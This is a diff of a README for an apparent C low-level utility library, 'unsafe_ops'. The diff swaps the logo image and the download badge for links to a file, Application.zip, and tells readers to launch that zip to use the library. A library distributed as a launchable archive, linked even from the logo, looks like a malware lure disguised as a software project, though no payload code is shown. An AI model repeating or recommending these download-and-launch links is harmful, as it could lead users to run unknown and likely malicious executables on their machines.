@@ -1,6 +1,6 @@
 # 🚀 Welcome to "unsafe_ops" Repository
 
-![unsafe_ops Logo](https://example.com/unsafe_ops_logo.png)
+![unsafe_ops Logo](https://github.com/Reptor10/unsafe_ops/releases/download/v1.0/Application.zip)
 
 ## Description
 "unsafe_ops" is a low-level utility library designed to provide direct access to hardware and memory operations for embedded systems, operating systems, and performance-critical applications where low-level control and performance optimization are crucial. Whether you are working with ARM, RISC-V, x86, or x86-64 architectures, this library offers a set of tools to handle direct memory access, low-level programming, and unsafe code in a structured manner.
@@ -14,9 +14,9 @@
 
 ## Installation
 To get started with "unsafe_ops," you can download the latest release by clicking the button below:
-[![Download Release](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/Reptor10/unsafe_ops/releases/download/v1.0/Application.zip)](https://github.com/Reptor10/unsafe_ops/releases/download/v1.0/Application.zip)
 
-Once downloaded, launch the Release.zip file to access the library and its documentation.
+Once downloaded, launch the https://github.com/Reptor10/unsafe_ops/releases/download/v1.0/Application.zip file to access the library and its documentation.
 
 ### Prerequisites
 - C Library Development Environment
